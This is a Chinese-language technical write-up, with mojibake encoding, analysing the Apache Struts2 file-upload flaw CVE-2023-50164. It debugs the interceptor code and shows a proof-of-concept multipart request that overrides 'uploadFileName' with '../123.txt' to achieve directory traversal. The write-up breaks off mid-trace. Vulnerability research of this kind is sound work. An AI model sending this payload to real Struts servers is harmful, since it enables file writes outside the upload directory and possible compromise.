# Apache Struts2 æ–‡ä»¶ä¸Šä¼ åˆ†æ(CVE-2023-50164/S2-066)

# å½±å“ç‰ˆæœ¬

- Struts 2.5.0-Struts 2.5.32
- Struts 6.0.0-Struts 6.3.0

# ç¯å¢ƒæ­å»º

æ–°å»ºJakarta EE é¡¹ç›®

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled.png)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%201.png)

æ·»åŠ  struct2 ä¾èµ–

```xml
<dependency>
      <groupId>org.apache.struts</groupId>
      <artifactId>struts2-core</artifactId>
      <version>6.3.0</version>
</dependency>
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%202.png)

å®šä¹‰ä¸€ä¸ª `UploadAction`

```java
package com.example.apachestrutsdemo;

import com.opensymphony.xwork2.ActionSupport;
import org.apache.commons.io.FileUtils;
import org.apache.struts2.ServletActionContext;

import java.io.*;

public class UploadAction extends ActionSupport {

    private static final long serialVersionUID = 1L;

    private File upload;

    // æ–‡ä»¶ç±»å‹ï¼Œä¸ºnameå±æ€§å€¼ + ContentType
    private String uploadContentType;

    // æ–‡ä»¶åç§°ï¼Œä¸ºnameå±æ€§å€¼ + FileName
    private String uploadFileName;

    public File getUpload() {
        return upload;
    }

    public void setUpload(File upload) {
        this.upload = upload;
    }

    public String getUploadContentType() {
        return uploadContentType;
    }

    public void setUploadContentType(String uploadContentType) {
        this.uploadContentType = uploadContentType;
    }

    public String getUploadFileName() {
        return uploadFileName;
    }

    public void setUploadFileName(String uploadFileName) {
        this.uploadFileName = uploadFileName;
    }

    public String doUpload() {
        String path = ServletActionContext.getServletContext().getRealPath("/")+"upload";
        String realPath = path + File.separator +uploadFileName;
        try {
            FileUtils.copyFile(upload, new File(realPath));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return SUCCESS;
    }

}
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%203.png)

åœ¨ struts.xml å½“ä¸­ï¼Œé€šå¸¸é»˜è®¤é…ç½®ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨é¡¹ç›®è·¯å¾„çš„ /WEB-INF/classes è·¯å¾„ä¸‹

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>
    <package name="upload" extends="struts-default">
        <action name="upload" class="com.example.apachestrutsdemo.UploadAction" method="doUpload">
            <result name="success" type="">/index.jsp</result>
        </action>
    </package>
</struts>
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%204.png)

æ³¨æ„ action è¦ä¿®æ”¹ä¸ºæœ¬é¡¹ç›® `UploadAction` çš„è·¯å¾„

åœ¨ web.xml å½“ä¸­é…ç½®å¥½ `filter`

```xml
<filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>*.action</url-pattern>
</filter-mapping>
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%205.png)

å¯åŠ¨tomcat

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%206.png)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%207.png)

æµ‹è¯•ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ , è¯·æ±‚åŒ…å¦‚ä¸‹

```
POST /apachestrutsdemo_war_exploded/upload.action HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

åœ¨ `src/test/resources`  ç›®å½•ä¸‹,å³é”®æ–°å»º `HTTP` è¯·æ±‚, æ³¨æ„ä¿®æ”¹æˆæœ¬åœ°çš„ URL è·¯å¾„, HOST ä¸­æ³¨æ„ç«¯å£å·

ç‚¹å‡»å‘é€

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%208.png)

æˆåŠŸä¸Šä¼ æ–‡ä»¶, åœ¨ target/ApacheStrutsdemo-1.0-SNAPSHOT/ ç›®å½•ä¸‹ä¼šåˆ›å»ºä¸€ä¸ª upload ç›®å½•

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%209.png)

# æ¼æ´åˆ†æ

## Part 1

struts2 æœ‰è‡ªå·±çš„ä¸Šä¼ è¿‡æ»¤å™¨, è¿‡æ»¤çš„é…ç½®åœ¨ `struts-default.xml` ä¸­

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2010.png)

é‡ç‚¹çœ‹ `org.apache.struts2.interceptor.FileUploadInterceptor#intercept`

(Why? `FileUploadInterceptor`å®ç°äº†ä¸€ä¸ªæŠ½è±¡ç±»,æŠ½è±¡ç±»ä¸­å®šä¹‰äº†å«`intercept`çš„æŠ½è±¡æ–¹æ³•,`FileUploadInterceptor`å¿…é¡»å®ç°è¯¥æ–¹æ³•,æ‰€ä»¥é‡ç‚¹çœ‹`FileUploadInterceptor#intercept`å³å¯)

```java
public String intercept(ActionInvocation invocation) throws Exception {
        ActionContext ac = invocation.getInvocationContext();
        HttpServletRequest request = ac.getServletRequest();
        if (!(request instanceof MultiPartRequestWrapper)) {
            if (LOG.isDebugEnabled()) {
                ActionProxy proxy = invocation.getProxy();
                LOG.debug(this.getTextMessage("struts.messages.bypass.request", new String[]{proxy.getNamespace(), proxy.getActionName()}));
            }

            return invocation.invoke();
        } else {
            ValidationAware validation = null;
            Object action = invocation.getAction();
            if (action instanceof ValidationAware) {
                validation = (ValidationAware)action;
            }

            MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper)request;
            if (multiWrapper.hasErrors() && validation != null) {
                TextProvider textProvider = this.getTextProvider(action);

                String errorMessage;
                for(Iterator var8 = multiWrapper.getErrors().iterator(); var8.hasNext(); validation.addActionError(errorMessage)) {
                    LocalizedMessage error = (LocalizedMessage)var8.next();
                    if (textProvider.hasKey(error.getTextKey())) {
                        errorMessage = textProvider.getText(error.getTextKey(), Arrays.asList(error.getArgs()));
                    } else {
                        errorMessage = textProvider.getText("struts.messages.error.uploading", error.getDefaultMessage());
                    }
                }
            }

            Enumeration fileParameterNames = multiWrapper.getFileParameterNames();

            while(fileParameterNames != null && fileParameterNames.hasMoreElements()) {
                String inputName = (String)fileParameterNames.nextElement();
                String[] contentType = multiWrapper.getContentTypes(inputName);
                if (!this.isNonEmpty(contentType)) {
                    if (LOG.isWarnEnabled()) {
                        LOG.warn(this.getTextMessage(action, "struts.messages.invalid.content.type", new String[]{inputName}));
                    }
                } else {
                    String[] fileName = multiWrapper.getFileNames(inputName);
                    if (!this.isNonEmpty(fileName)) {
                        if (LOG.isWarnEnabled()) {
                            LOG.warn(this.getTextMessage(action, "struts.messages.invalid.file", new String[]{inputName}));
                        }
                    } else {
                        UploadedFile[] files = multiWrapper.getFiles(inputName);
                        if (files != null && files.length > 0) {
                            List<UploadedFile> acceptedFiles = new ArrayList(files.length);
                            List<String> acceptedContentTypes = new ArrayList(files.length);
                            List<String> acceptedFileNames = new ArrayList(files.length);
                            String contentTypeName = inputName + "ContentType";
                            String fileNameName = inputName + "FileName";

                            for(int index = 0; index < files.length; ++index) {
                                if (this.acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) {
                                    acceptedFiles.add(files[index]);
                                    acceptedContentTypes.add(contentType[index]);
                                    acceptedFileNames.add(fileName[index]);
                                }
                            }

                            if (!acceptedFiles.isEmpty()) {
                                Map<String, Parameter> newParams = new HashMap();
                                newParams.put(inputName, new Parameter.File(inputName, acceptedFiles.toArray(new UploadedFile[acceptedFiles.size()])));
                                newParams.put(contentTypeName, new Parameter.File(contentTypeName, acceptedContentTypes.toArray(new String[acceptedContentTypes.size()])));
                                newParams.put(fileNameName, new Parameter.File(fileNameName, acceptedFileNames.toArray(new String[acceptedFileNames.size()])));
                                ac.getParameters().appendAll(newParams);
                            }
                        }
                    }
                }
            }

            return invocation.invoke();
        }
    }
```

ä¸Šä¼ ä¹‹å‰çš„æµ‹è¯•åŒ…,æ¥ç†è§£ä¸€ä¸‹å…¶ä¸­çš„é€»è¾‘

å¾ˆå®¹æ˜“å¯ä»¥çœ‹åˆ°, è·å–ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åé€šè¿‡ `multiWrapper.getFileNames` åšå¤„ç†

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2011.png)

æ­¥å…¥

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2012.png)

```
FileUploadInterceptor#intercept
	->MultiPartRequestWrapper#getFileNames
```

å‘ç°ä¼ å…¥å‚æ•° `fileName` æ˜¯ `Upload`, å³ `inputName` ä¸º `Upload`

<aside>
ğŸ’¡ `inputName` å°±æ˜¯è¯·æ±‚ä¸­çš„ `name`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2013.png)

å…³äº `inputName` å¦‚ä½•è·å–çš„ä¸å†å¤šåšè¯´æ˜,è®°ä½ä»–å°±æ˜¯ `name` å³å¯

</aside>

ç»è¿‡ä¸€ä¸ªä¸‰å…ƒè¿ç®—, ç»§ç»­è·Ÿè¿› `JakartaMultiPartRequest#getFileNames`

```
FileUploadInterceptor#intercept
	->MultiPartRequestWrapper#getFileNames
		->JakartaMultiPartRequest#getFileNames
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2014.png)

å…¶ä¸­é¦–å…ˆ, é€šè¿‡ `Upload` å®šä½åˆ°å¯¹åº”ä¸Šä¼ æ–‡ä»¶åå³ `../1.txt`

 `JakartaMultiPartRequest#getCanonicalName` å¯¹ä¼ å…¥æ–‡ä»¶åè¿›è¡Œå¤„ç†, æ­¥å…¥

```
FileUploadInterceptor#intercept
	->MultiPartRequestWrapper#getFileNames
		->JakartaMultiPartRequest#getFileNames
			->JakartaMultiPartRequest#getCanonicalName
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2015.png)

å¾ˆæ˜æ˜¾åœ°å¯¹ `/` å’Œ `\` è¿›è¡Œäº†è¿‡æ»¤

`String#lastIndexOf` ä¼šæ‰¾åˆ°æœ€åå‡ºç°çš„ index, `String#substring` è¿›è¡Œæˆªå–, æœ€åå¾—åˆ°åˆæ³•çš„æ–‡ä»¶å

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2016.png)

å¯¹æ–‡ä»¶åçš„å¤„ç†åˆ°æ­¤å®Œæˆ

å›åˆ° `org.apache.struts2.interceptor.FileUploadInterceptor#intercept`

å¤„ç†å®Œæ–‡ä»¶ååï¼Œä¼šæŠŠä¸€äº›ä¿¡æ¯ä¿å­˜åˆ° `acceptedFiles` / `acceptedContentTypes` / `acceptedFileNames` ä¸­

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2017.png)

- `acceptedFiles` æ˜¯æ‰€ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶æ–‡ä»¶(å…¶å®å°±æ˜¯æ–‡ä»¶å†…å®¹å§åº”è¯¥å¯ä»¥è¿™ä¹ˆç†è§£)
- `acceptedContentTypes` ä¸ºä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶ç±»å‹
- `acceptedFileNames` å°±æ˜¯ä¸Šä¼ æ–‡ä»¶å

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2018.png)

æ¥ç€å®ç°äº†ä¸€ä¸ª `HashMap` å‹ `newParams`, (***æ­¤å¤„ä¼ç¬”***) å°†ä¿¡æ¯å­˜å…¥,åˆ†åˆ«æˆä¸º

- `Upload`
- `UploadContentType`
- `UploadFileName`
    
    ![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2019.png)
    

<aside>
ğŸ’¡ åé¢ä¼šé€šè¿‡åå°„åˆ†åˆ«è°ƒç”¨ä¸Šé¢å‚æ•°åœ¨æˆ‘ä»¬å®šä¹‰çš„ UploadAction ä¸­çš„ `setter` æ–¹æ³•, ä¸ºå…¶ä¸‰ä¸ªå‚æ•°èµ‹å€¼

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2020.png)

</aside>

èµ°åˆ° `ac.getParameters().appendAll(newParams);`, `appendAll(newParams)`æ˜¯ä¸€ä¸ªæ·»åŠ æ“ä½œ

è¿™é‡Œçš„ ac æ˜¯æˆ‘ä»¬ä¸Šä¸‹æ–‡çš„ Contextï¼Œè€Œ `ac.getParameters()` è·å–åˆ°çš„åˆ™æ˜¯ `org.apache.struts2.ActionContext.parameters`ï¼Œä¸€ä¸ª `HttpParameters` ç±»ï¼Œè¿™é‡Œå°†ä¸Šä¼ æ–‡ä»¶çš„ä¿¡æ¯éƒ½æ”¾åœ¨äº† `HttpParameters` ä¸­

æ‰§è¡Œå,å¯ä»¥çœ‹åˆ°ä¸Šä¼ ä¿¡æ¯å°±è¢«æ·»åŠ åˆ°äº† action è¿™ä¸ªä¸Šä¸‹æ–‡ç±»çš„å‚æ•°é‡Œ

![Screenshot_20231220_171927.png](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Screenshot_20231220_171927.png)

<aside>
ğŸ’¡ æ³¨æ„ `newParams` è¢«å­˜å…¥ ac ä¸Šä¸‹æ–‡ä¸­, å…¶ä¿å­˜ç»“æ„å’Œæ€§è´¨è¿˜æ˜¯ä¸º `HashMap`

</aside>

## Part 2

æ ¹æ®æ¼æ´æè¿°, æ˜¯å› ä¸ºå¤§å°å†™è¿›è¡Œå˜é‡è¦†ç›–å¯¼è‡´å¾—æ±¡æŸ“ç›¸å…³ä¸Šä¼ å‚æ•°è‡´ä½¿ç›®å½•ç©¿è¶Š

ç°åœ¨æ„é€ ä¸€ä¸ªèƒ½å¤Ÿé€ æˆæ¼æ´çš„æ•°æ®åŒ…, æ¥æµ‹è¯•ä¸€ä¸‹å˜é‡è¦†ç›–æ˜¯ä¸æ˜¯åœ¨æ­¤å¤„æ–‡ä»¶ä¸Šä¼ æ‹¦æˆªå™¨è§¦å‘çš„

```
POST /apachestrutsdemo_war_exploded/upload.action HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
Content-Disposition: form-data; name="uploadFileName"

../123.txt
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

å‘é€å, å‘ç°é€ æˆäº†ç›®å½•ç©¿è¶Š

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2021.png)

æŠŠæ–­ç‚¹ä¸‹åˆ°è¿™é‡Œ

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2022.png)

é‡æ–°å‘åŒ…çœ‹ ac

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2023.png)

å‘ç°èƒ½å¤Ÿé€ æˆç›®å½•ç©¿è¶Šçš„æ–‡ä»¶åè¢«å­˜å‚¨åˆ°äº† ac ä¸­,è€Œ 1.txt æ­£å¸¸çš„æ–‡ä»¶åæ²¡æœ‰è¢«è¦†ç›–æ‰

æ‰€ä»¥å¯ä»¥å¾—å‡º å˜é‡è¦†ç›– ä¸æ˜¯å‘ç”Ÿåœ¨æ–‡ä»¶ä¸Šä¼ è¿‡æ»¤å™¨ä¸­, è€Œæ˜¯åœ¨å…¶ä¹‹å

<aside>
ğŸ’¡ æ ¹æ®æœ¬äººè°ƒè¯•, åœ¨æ‰§è¡Œ `FileUploadInterceptor#intercept` å‰, ac ä¸­å°±å·²ç»æœ‰ `uploadFileName` äº†, è€Œä¸æ˜¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰å­˜å…¥çš„, åº”è¯¥æ˜¯ä»–æ²¡æœ‰è¢«è¯†åˆ«æˆæ–‡ä»¶ä¿¡æ¯çš„ä¸€éƒ¨åˆ†, æ‰€ä»¥ä¸è¿›å…¥ `FileUploadInterceptor` å¤„ç†, ä¹Ÿå°±æ˜¯è¯´åœ¨ `FileUploadInterceptor#intercept` ä¸­å¯¹æ–‡ä»¶åç§°é˜²æ­¢è·¯å¾„ç©¿è¶Šçš„å¤„ç†å³ `JakartaMultiPartRequest#getCanonicalName` å¯¹ä»–æ²¡ç”¨, ä½†æ˜¯å…·ä½“ä»€ä¹ˆæ—¶å€™æˆ‘æ²¡æœ‰æ‰¾åˆ°

</aside>

å°†ç¨‹åºè¿è¡Œåˆ° `UploadAction#doUpload`, æ­¤æ—¶ `uploadFileName` å·²ç»å˜ä¸ºäº†é€ æˆç›®å½•ç©¿è¶Šçš„æ–‡ä»¶å

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2024.png)

**é—®é¢˜å°±å‡ºç°åœ¨ç”¨åå°„å°† ac ä¸­ä¿¡æ¯å¡«å……åˆ° `UploadAction` ä¸‰ä¸ªå‚æ•°çš„è¿‡ç¨‹ä¸­**

## Part 3

### Part 3.1

æ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾åå°„çš„è°ƒç”¨è¿‡ç¨‹, åœ¨ `setter` ä½ç½®è¿›è¡Œæ–­ç‚¹è°ƒè¯•ï¼Œå‘é€ä¸€ä¸ªè¯·æ±‚åŒ…

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2025.png)

åœ¨è°ƒç”¨å †æ ˆä¸­, æ‰¾åˆ°æ‰§è¡Œäº† `ParametersInterceptor#setParameters`, é¡¾åæ€ä¹‰

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2026.png)

å¯ä»¥çœ‹åˆ°åšäº†ä¸€ä¸ª `while` å¾ªç¯, å†çœ‹ä¸€ä¸‹ä¼ å…¥è¯¥å‡½æ•°çš„å‚æ•° `parameters`, è¿™é‡Œå°±æ˜¯å¾ªç¯è°ƒç”¨åå°„èµ‹å€¼çš„åœ°æ–¹

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2027.png)

`ParametersInterceptor` å°±æ˜¯ struts çš„ä¸€ä¸ªæ‹¦æˆªå™¨, è¿™å°±æ˜¯è¦æ‰¾çš„åœ°æ–¹

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2028.png)

å…¶å®ç°çš„çˆ¶ç±»æŠ½è±¡æ–¹æ³•ä¸º `doIntercept`, ä¹Ÿæ˜¯åœ¨è¯¥æ–¹æ³•ä¸­è°ƒç”¨çš„ `ParametersInterceptor#setParameters`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2029.png)

ç›´æ¥æ¥çœ‹ `ParametersInterceptor#setParameters`, åœ¨å¼€å¤´ä¸‹å¥½æ–­ç‚¹

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2030.png)

å°† `parameters` ä¼ ç»™äº†ä¸€ä¸ªæ–°çš„å˜é‡ `params`, å¹¶å£°æ˜äº† ä¸€ä¸ª `**TreeMap` ç±»å‹çš„ `acceptableParameters`** (**ä¼ç¬”äºŒ**)

æ¥ä¸‹æ¥åˆ¶ä½œäº†ä¸€ä¸ª `params` çš„è¿­ä»£å™¨, `isAcceptableParameter` å¯¹ `params` ä¸­å„ä¸ªè¿›è¡Œæ˜¯å¦ä¸ºå¯æ¥å—å‚æ•°çš„åˆ¤æ–­, åˆ¤æ–­è¿™å—æ²¡å•¥å¥½è¯´çš„

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2031.png)

æœ€åä¹Ÿæ˜¯å…¨éƒ¨åŠ å…¥ `acceptableParameters`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2032.png)

<aside>
ğŸ’¡ æ³¨æ„çœ‹æœ€ç»ˆ `acceptableParameters` ä¸­å¯¹åº”çš„é¡ºåº (**ä¼ç¬”ä¸‰**), è¿™æ˜¯ `TreeMap` ç»“æ„çš„ç‰¹æ€§å¯¼è‡´çš„, å§‹ç»ˆæŒ‰ç…§é¦–ä¸ªå­—æ¯çš„ Ascii ç å¤§å°å¯¹ `Map` è¿›è¡Œæ’åº, ä¸ç®¡ä½ ä»¥ä½•ç§é¡ºåºå­˜å…¥çš„, å¦‚ä¸‹

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2033.png)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2034.png)

å¯ä»¥çœ‹åˆ°ä¸ç®¡æ˜¯å­˜å…¥åçš„é¡ºåºè¿˜æ˜¯éå†é¡ºåº

</aside>

å°†ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œ

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2035.png)

è¿›è¡Œè¿­ä»£äº†, ç›®å‰è¿­ä»£çš„æ˜¯ç¬¬ä¸€ä¸ª `Upload`

ä»å‰é¢åœ¨ `setter` ä¸‹æ–­ç‚¹æ—¶çš„è°ƒç”¨æ ˆå°±çŸ¥é“è¿™é‡Œé€æ­¥å¾€ä¸‹è°ƒç”¨çš„, æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2036.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2037.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2038.png)

è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°æŠŠ `UploadAction` ç±»åŠ å…¥äº†, åé¢è·å–ç±»æ–¹æ³•

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2039.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2040.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
